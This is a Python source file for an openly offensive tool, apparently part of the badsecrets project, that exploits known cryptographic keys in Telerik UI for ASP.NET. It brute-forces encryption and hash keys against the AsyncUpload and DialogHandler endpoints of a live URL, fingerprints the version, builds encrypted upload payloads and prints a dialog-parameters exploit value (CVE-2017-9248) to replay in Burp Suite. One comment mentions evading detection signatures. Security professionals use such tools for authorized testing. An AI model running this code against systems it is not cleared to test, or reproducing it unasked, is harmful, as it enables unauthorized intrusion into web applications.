#!/usr/bin/env python3
# badsecrets - Telerik UI known key exploitation tool
# Black Lantern Security - https://www.blacklanternsecurity.com
# @paulmmueller

import os
import re
import sys
import string
import base64
import random
import urllib.parse
import argparse
import requests
from itertools import chain

from requests.packages.urllib3.exceptions import InsecureRequestWarning

from Crypto.Cipher import AES
from Crypto.Hash import HMAC
from Crypto.Hash import SHA256

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(SCRIPT_DIR))

from badsecrets import modules_loaded

Telerik_HashKey = modules_loaded["telerik_hashkey"]
Telerik_EncryptionKey = modules_loaded["telerik_encryptionkey"]


def random_hex_string(length):
    random_digits = [random.choice(string.hexdigits) for _ in range(length)]
    return "".join(random_digits).lower()


def validate_url(
    arg_value,
    pattern=re.compile(
        r"^https?://((?:[A-Z0-9_]|[A-Z0-9_][A-Z0-9\-_]*[A-Z0-9_])[\.]?)+(?:[A-Z0-9_][A-Z0-9\-_]*[A-Z0-9_]|[A-Z0-9_])(?::[0-9]{1,5})?.*$",
        re.IGNORECASE,
    ),
):
    if not pattern.match(arg_value):
        raise argparse.ArgumentTypeError("URL is not formatted correctly")
    return arg_value


telerik_versions = [
    "2007.1.423",
    "2007.1.521",
    "2007.1.626",
    "2007.2.918",
    "2007.2.1010",
    "2007.2.1107",
    "2007.3.1218",
    "2007.3.1314",
    "2007.3.1425",
    "2008.1.415",
    "2008.1.515",
    "2008.1.619",
    "2008.2.723",
    "2008.2.826",
    "2008.2.1001",
    "2008.3.1105",
    "2008.3.1125",
    "2008.3.1314",
    "2009.1.311",
    "2009.1.402",
    "2009.1.527",
    "2009.2.701",
    "2009.2.826",
    "2009.3.1103",
    "2009.3.1208",
    "2009.3.1314",
    "2010.1.309",
    "2010.1.415",
    "2010.1.519",
    "2010.2.713",
    "2010.2.826",
    "2010.2.929",
    "2010.3.1109",
    "2010.3.1215",
    "2010.3.1317",
    "2011.1.315",
    "2011.1.413",
    "2011.1.519",
    "2011.2.712",
    "2011.2.915",
    "2011.3.1115",
    "2011.3.1305",
    "2012.1.215",
    "2012.1.411",
    "2012.2.607",
    "2012.2.724",
    "2012.2.912",
    "2012.3.1016",
    "2012.3.1205",
    "2012.3.1308",
    "2013.1.220",
    "2013.1.403",
    "2013.1.417",
    "2013.2.611",
    "2013.2.717",
    "2013.3.1015",
    "2013.3.1114",
    "2013.3.1324",
    "2014.1.225",
    "2014.1.403",
    "2014.2.618",
    "2014.2.724",
    "2014.3.1024",
    "2015.1.204",
    "2015.1.225",
    "2015.1.401",
    "2015.2.604",
    "2015.2.623",
    "2015.2.729",
    "2015.2.826",
    "2015.3.930",
    "2015.3.1111",
    "2016.1.113",
    "2016.1.1213",
    "2016.1.225",
    "2016.2.504",
    "2016.2.607",
    "2016.3.914",
    "2016.3.1018",
    "2016.3.1027",
    "2017.1.118",
    "2017.1.228",
    "2017.2.503",
    "2017.2.621",
    "2017.2.711",
    "2017.3.913",
]

telerik_versions_patched = [
    "2022.3.1109",
    "2022.3.913",
    "2022.2.622",
    "2022.2.511",
    "2022.1.302",
    "2022.1.119",
    "2021.3.1111",
    "2021.3.914",
    "2021.2.616",
    "2021.2.511",
    "2021.1.330",
    "2021.1.224",
    "2021.1.119",
    "2020.3.1021",
    "2020.3.915",
    "2020.2.617",
    "2020.2.512",
    "2020.1.219",
    "2020.1.114",
    "2019.3.1023",
    "2019.3.917",
    "2019.2.514",
    "2019.1.215",
    "2019.1.115",
    "2018.3.910",
    "2018.2.710",
    "2018.2.516",
    "2018.1.117",
]


# Heavily derived from https://github.com/bao7uo/RAU_crypto/blob/master/RAU_crypto.py <3
class AsyncUpload:
    def __init__(self, url, include_machinekeys_bool=False, proxies={}, headers=None):
        self.url = url
        self.asyncupload_key = None
        if proxies == None:
            proxies = {}
        self.proxies = proxies
        self.headers = headers
        self.include_machinekeys_bool = include_machinekeys_bool
        self.telerik_hashkey = Telerik_HashKey()
        self.telerik_encryptionkey = Telerik_EncryptionKey()
        self.target_temp_folder = "C:\\windows\\temp\\"
        self.payload_file_name = "test.txt"

    def encrypt(self, plaintext, key, iv):
        encoded = ""
        for i in plaintext:
            encoded = encoded + i + "\x00"
        plaintext = encoded + (chr(16 - (len(encoded) % 16)) * (16 - (len(encoded) % 16)))
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return base64.b64encode(cipher.encrypt(plaintext.encode())).decode()

    def add_hmac(self, string, version, hashkey):
        if int(version[:4]) >= 2017:
            hmac_generator = HMAC.new(key=bytes(hashkey.encode()), msg=string.encode(), digestmod=SHA256.new())
            encoded_hmac = base64.b64encode(hmac_generator.digest()).decode()
            return f"{string}{encoded_hmac}"
        return string

    def version_probe(self):
        derived_key, iv = self.telerik_encryptionkey.telerik_derivekeys_PBKDF1_MS("GreatScott!")
        data, multipart_boundary = self.rau_data_prep("1985.10.26", derived_key, iv, "ThinkMcFlyThink")
        session = requests.Session()
        session.proxies.update(self.proxies)
        request = requests.Request("POST", self.url, data=data)
        request = request.prepare()
        request.headers["Content-Type"] = (
            f"multipart/form-data; boundary=---------------------------{multipart_boundary}"
        )
        request.headers.update(self.headers)
        resp = session.send(request, verify=False)
        if "Exception Details: " in resp.text:
            print("Verbose Errors are enabled!")
            if "Telerik.Web.UI.CryptoExceptionThrower.ThrowGenericCryptoException" in resp.text:
                print("Version is Post-2020 (Encrypt-Then-Mac Enabled, with Generic Crypto Failure Message)")
            elif "Padding is invalid and cannot be removed" in resp.text:
                print("Version is <= 2019 (Either Vulnerable, or Encrypt-Then-Mac with separate failure Message)")
            else:
                print("Version could not be determined")
        else:
            print("Verbose Errors NOT enabled")

    def rau_data_prep(self, version, key, iv, hashkey):
        multipart_boundary = random_hex_string(14)
        enc_target_folder = self.add_hmac(self.encrypt("", key, iv), version, hashkey)
        enc_target_temp_folder = self.add_hmac(self.encrypt(self.target_temp_folder, key, iv), version, hashkey)
        enc_a = f'{{"TargetFolder":"{enc_target_folder}","TempTargetFolder":"{enc_target_temp_folder}","MaxFileSize":0,"TimeToLive":{{"Ticks":1440000000000,"Days":0,"Hours":40,"Minutes":0,"Seconds":0,"Milliseconds":0,"TotalDays":1.6666666666666666,"TotalHours":40,"TotalMinutes":2400,"TotalSeconds":144000,"TotalMilliseconds":144000000}},"UseApplicationPoolImpersonation":false}}'
        enc_b = f'Telerik.Web.UI.AsyncUploadConfiguration, Telerik.Web.UI, Version="{version}", Culture=neutral, PublicKeyToken=121fae78165ba3d4'

        payload = ""
        payload += f"-----------------------------{multipart_boundary}\r\n"
        payload += 'Content-Disposition: form-data; name="rauPostData"\r\n\r\n'
        payload += f"{self.encrypt(enc_a,key,iv)}&{self.encrypt(enc_b,key,iv)}\r\n"
        payload += f"-----------------------------{multipart_boundary}\r\n"
        payload += 'Content-Disposition: form-data; name="file"; filename="blob"\r\n'
        payload += "Content-Type: application/octet-stream\r\n"
        payload += "\r\n"
        payload += f"{random_hex_string(8)}"
        payload += "\r\n"
        payload += f"-----------------------------{multipart_boundary}\r\n"
        payload += 'Content-Disposition: form-data; name="fileName"\r\n'
        payload += "\r\n"
        payload += f"{random_hex_string(8)}\r\n"
        payload += f"-----------------------------{multipart_boundary}\r\n"
        payload += 'Content-Disposition: form-data; name="contentType"\r\n'
        payload += "\r\n"
        payload += "text/html\r\n"
        payload += f"-----------------------------{multipart_boundary}\r\n"
        payload += 'Content-Disposition: form-data; name="lastModifiedDate"\r\n'
        payload += "\r\n"
        payload += "2020-01-02T08:02:01.067Z\r\n"  # randomize later to avoid signatures
        payload += f"-----------------------------{multipart_boundary}\r\n"
        payload += 'Content-Disposition: form-data; name="metadata"\r\n'
        payload += "\r\n"
        payload += f'{{"TotalChunks":1,"ChunkIndex":0,"TotalFileSize":1,"UploadID":"{random_hex_string(12)}.txt"}}\r\n'
        payload += f"-----------------------------{multipart_boundary}--\r\n"
        payload += "\r\n"
        return bytes(payload, "utf8"), multipart_boundary

    @staticmethod
    def select_derive_algos(version):
        if int(version[:4]) <= 2017 or version == "2018.1.117":
            return ["PBKDF1_MS"]
        elif (int(version[:4]) >= 2020) or (int(version[:4]) == 2019 and int(version[5]) >= 2):
            return ["PBKDF2"]

        else:  # We don't have solid intelligence on these version so we will try both
            return ["PBKDF1_MS", "PBKDF2"]

    def solve_key(self):
        reported_early_indicator = False

        for telerik_version in chain(telerik_versions, telerik_versions_patched):
            print(telerik_version)
            hashkeys = (
                ["dummyvalue"]
                if int(telerik_version[:4]) < 2017
                else self.telerik_hashkey.prepare_keylist(include_machinekeys=self.include_machinekeys_bool)
            )
            for hashkey in hashkeys:
                for key in self.telerik_encryptionkey.prepare_keylist(
                    include_machinekeys=self.include_machinekeys_bool
                ):
                    derive_algos = self.select_derive_algos(telerik_version)
                    for derive_algo in derive_algos:
                        if derive_algo == "PBKDF1_MS":
                            derived_key, iv = self.telerik_encryptionkey.telerik_derivekeys_PBKDF1_MS(key)
                        elif derive_algo == "PBKDF2":
                            derived_key, iv = self.telerik_encryptionkey.telerik_derivekeys_PBKDF2(key)

                        data, multipart_boundary = self.rau_data_prep(telerik_version, derived_key, iv, hashkey)
                        session = requests.Session()
                        session.proxies.update(self.proxies)
                        request = requests.Request("POST", self.url, data=data)
                        request = request.prepare()
                        request.headers["Content-Type"] = (
                            f"multipart/form-data; boundary=---------------------------{multipart_boundary}"
                        )
                        request.headers.update(self.headers)
                        resp = session.send(request, verify=False)
                        if "Could not load file or assembly" in resp.text:
                            if reported_early_indicator == False:
                                print(
                                    "Detected early signs that target is likely vulnerable! Continuing to find vulnerable version..."
                                )
                                reported_early_indicator = True

                        if '{"fileInfo":{"FileName":"' in resp.text:
                            result_text = f"TARGET VULNERABLE! Version: [{telerik_version}] Encryption Key: [{key}]"
                            if hashkey != "dummyvalue":
                                result_text += f" Hash Key: [{hashkey}]"

                            result_text += f" Derive Algo: [{derive_algo}]"
                            print(result_text)
                            return
        print("Key(s) not found :(")


class DialogHandler:
    def __init__(self, url, include_machinekeys_bool=False, proxies={}, headers=None):
        self.url = url
        self.telerik_hashkey = Telerik_HashKey()
        self.telerik_encryptionkey = Telerik_EncryptionKey()
        self.encryption_key = None
        self.hash_key = None
        if proxies == None:
            proxies = {}
        self.proxies = proxies
        self.headers = headers
        self.include_machinekeys_bool = include_machinekeys_bool

    def probe_version(self, version):
        b64section_plain = f"Telerik.Web.UI.Editor.DialogControls.DocumentManagerDialog, Telerik.Web.UI, Version={version}, Culture=neutral, PublicKeyToken=121fae78165ba3d4"
        b64section = base64.b64encode(b64section_plain.encode()).decode()
        plaintext = f"EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;EnableEmbeddedBaseStylesheet,False,3,True;RenderMode,False,2,2;UploadPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,204800;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;IsSkinTouch,False,3,False;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,{b64section};AllowMultipleSelection,False,3,False"
        derivedKey, derivedIV = self.telerik_encryptionkey.telerik_derivekeys(
            self.encryption_key, self.key_derive_mode
        )
        ct = self.telerik_encryptionkey.telerik_encrypt(derivedKey, derivedIV, plaintext)
        dialog_parameters = self.telerik_hashkey.sign_enc_dialog_params(self.hash_key, ct)
        dialog_parameters_data = {"dialogParametersHolder": dialog_parameters}
        r = requests.post(
            self.url, data=dialog_parameters_data, headers=self.headers, verify=False, proxies=self.proxies
        )
        if r.status_code != 500:
            print(version)
        if r.status_code == 200:
            return dialog_parameters

    def detect_derive_function(self):
        self.key_derive_mode = "PBKDF1_MS"
        KDF_probe_data = {"dialogParametersHolder": "AAAA"}
        res = requests.post(self.url, data=KDF_probe_data, proxies=self.proxies, headers=self.headers, verify=False)
        resp_body = res.text

        if (
            "Exception of type 'System.Exception' was thrown" in resp_body
            or "The cryptographic operation has failed!" in resp_body
        ):
            self.key_derive_mode = "PBKDF2"
            print(
                "Target is a newer version of Telerik UI without verbose error messages. Hash key and Encryption key will have to BOTH match. PBKDF2 key derivation is used."
            )
        elif "Length cannot be less than zero" in resp_body:
            self.key_derive_mode = "PBKDF1_MS"
            print(
                "Target is post-CVE-2017-9248 patched but old enough to use older PBKDF1_MS key dervivation. Hash key can be solved independently."
            )
        elif "Invalid length for a Base-64 char array or string" in resp_body:
            return
        else:
            print(f"Unexpected response encountered: [{resp_body}] aborting.")
            sys.exit()

        print("Target is a valid DialogHandler endpoint. Brute forcing Telerik Hash Key...")

    def solve_key(self):
        # PBKDF1_MS MODE
        if self.key_derive_mode == "PBKDF1_MS":
            hashkey_counter = 0
            for hash_key_probe, hash_key in self.telerik_hashkey.hashkey_probe_generator(
                include_machinekeys=self.include_machinekeys_bool
            ):
                hashkey_counter += 1
                data = {"dialogParametersHolder": hash_key_probe}
                res = requests.post(self.url, data=data, proxies=self.proxies, headers=self.headers, verify=False)
                resp_body = urllib.parse.unquote(res.text)

                print(f"Tested {hashkey_counter} hash keys so far...") if hashkey_counter % 1000 == 0 else None

                if "The input data is not a complete block" in resp_body:
                    print(f"Found matching hashkey! [{hash_key}]")

                    self.hash_key = hash_key
                    break

                elif "The input is not a valid Base-64 string" in resp_body:
                    print("The target appears to be a pre-2017 version, and does not have a hash key.")
                    print("This means it should be vulnerable to CVE-2017-9248!!!")
                    return

            if self.hash_key:
                print("Since we found a valid hash key, we can check for known Telerik Encryption Keys")

                encryptionkey_counter = 0
                for encryption_key_probe, encryption_key in self.telerik_encryptionkey.encryptionkey_probe_generator(
                    hash_key, self.key_derive_mode, include_machinekeys=self.include_machinekeys_bool
                ):
                    encryptionkey_counter += 1
                    data = {"dialogParametersHolder": encryption_key_probe}
                    res = requests.post(self.url, data=data, proxies=self.proxies, headers=self.headers, verify=False)

                    (
                        print(f"Tested {encryptionkey_counter} encryption keys so far...")
                        if encryptionkey_counter % 1000 == 0
                        else None
                    )

                    if "Index was outside the bounds of the array" in res.text:
                        print(f"Found Encryption key! [{encryption_key}]")
                        self.encryption_key = encryption_key
                        break

                if self.encryption_key == None:
                    print("Could not identify encryption key.")
                    return
            else:
                print("Could not identify hash key.")
                return

        elif self.key_derive_mode == "PBKDF2":
            if self.include_machinekeys_bool:
                print(
                    "Warning: MachineKeys inclusion mode is enabled, which affects this Telerik version particularly dramatically. Brute Forcing will be VERY SLOW"
                )
                print("Try without the MachineKeys first!")
            print("About to bruteforce hash key and encryption key combinations...")
            count = 0
            for hash_key in self.telerik_hashkey.prepare_keylist(include_machinekeys=self.include_machinekeys_bool):
                for encryption_key_probe, encryption_key in self.telerik_encryptionkey.encryptionkey_probe_generator(
                    hash_key, self.key_derive_mode, include_machinekeys=self.include_machinekeys_bool
                ):
                    count += 1
                    data = {"dialogParametersHolder": encryption_key_probe}
                    res = requests.post(self.url, data=data, proxies=self.proxies, headers=self.headers, verify=False)
                    if "Index was outside the bounds of the array" in res.text:

                        print(f"Found Encryption key! [{encryption_key}]")
                        print(f"Found matching hashkey! [{hash_key}]")

                        self.encryption_key = encryption_key
                        self.hash_key = hash_key
                        break

                    (
                        print(f"Tested {count} hash key / encryption key combinations so far...")
                        if count % 1000 == 0
                        else None
                    )

                if self.hash_key:
                    break

        if self.hash_key and self.encryption_key:
            return True
        else:
            print("Did not find hashkey / encryption key. Exiting.")

    def solve_version(self):
        print(
            "Both encryption key and hash key were found: attempting to brute-force Telerik UI version and generate exploitation payload"
        )

        versions = []
        for v in telerik_versions + telerik_versions_patched:
            versions.append(v)
        undotted_versions = []
        for v in telerik_versions:
            undotted_versions.append(re.sub(r"\.(?=\d+$)", "", v))
        versions += undotted_versions

        for version in versions:
            dialog_parameters = self.probe_version(version)
            if dialog_parameters:
                self.version = version
                self.dialog_parameters = dialog_parameters
                return True


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-u",
        "--url",
        type=validate_url,
        help="The URL of the page to access and attempt to pull viewstate and generator from",
        required=True,
    )

    parser.add_argument(
        "-p",
        "--proxy",
        help="Optionally specify an HTTP proxy",
    )

    parser.add_argument(
        "-a",
        "--user-agent",
        help="Optionally set a custom user-agent",
    )

    parser.add_argument(
        "-m", "--machine-keys", help="Optionally include ASP.NET MachineKeys when loading keys", action="store_true"
    )

    parser.add_argument(
        "-f",
        "--force",
        help="Force enumeration of vulnerable AsyncUpload endpoint without user confirmation",
        action="store_true",
    )
    args = parser.parse_args()

    if not args.url:
        return

    include_machinekeys_bool = False
    if args.machine_keys:
        include_machinekeys_bool = True
        print("MachineKeys inclusion enabled. Bruteforcing will take SIGNIFICANTLY longer")

    proxies = None
    if args.proxy:
        proxies = {"http": args.proxy, "https": args.proxy}

    headers = {}
    if args.user_agent:
        headers["User-agent"] = args.user_agent
    else:
        headers["User-agent"] = (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
        )

    if "webresource.axd" in args.url.lower():
        print("Assuming target is a AsyncUpload Endpoint...")
        asyncupload_endpoint = args.url.split("?")[0] + "?type=RAU"
        try:
            res = requests.get(asyncupload_endpoint, proxies=proxies, headers=headers, verify=False)
        except (requests.exceptions.ConnectionError, requests.exceptions.ConnectTimeout):
            print(f"Error connecting to URL: [{args.url}]")
            return
        resp_body = urllib.parse.unquote(res.text)
        if "RadAsyncUpload handler is registered succesfully" not in resp_body:
            print(f"URL does not appear to be a Telerik UI AsyncUpload Endpoint")
            return
        else:
            print("Target is confirmed to be Telerik UI Async Upload Endpoint")

            rau = AsyncUpload(
                asyncupload_endpoint,
                proxies=proxies,
                headers=headers,
                include_machinekeys_bool=include_machinekeys_bool,
            )
            rau.version_probe()
            if not args.force:
                response = input("Ready to attempt brute-force, press enter to continue...")
                if response.lower() != "":
                    print("aborting...")
                    sys.exit(2)
            rau.solve_key()
            return

    else:
        print("Assuming target is Telerik UI DialogHandler...")
        try:
            res = requests.get(args.url, proxies=proxies, headers=headers, verify=False)
        except (requests.exceptions.ConnectionError, requests.exceptions.ConnectTimeout):
            print(f"Error connecting to URL: [{args.url}]")
            return
        resp_body = urllib.parse.unquote(res.text)
        if "Loading the dialog..." not in resp_body:
            print(f"URL does not appear to be a Telerik UI DialogHandler")
            return
        else:
            print(f"Confirmed target is Telerik UI DialogHandler")

        dh = DialogHandler(
            args.url, proxies=proxies, headers=headers, include_machinekeys_bool=include_machinekeys_bool
        )
        dh.detect_derive_function()
        if dh.solve_key():
            print("solved key!")
            if dh.solve_version():
                print(f"Found Telerik Version! [{dh.version}]")
                print("Submit a POST request, with dialogParametersHolder POST parameter set to this value")
                print("Then use Burp Suite to replay the request in the browser")
                print("Dialog Parameters Exploit Value:")
                print(urllib.parse.quote_plus(dh.dialog_parameters))


if __name__ == "__main__":
    print("badsecrets - Telerik UI known key exploitation tool\n")
    main()
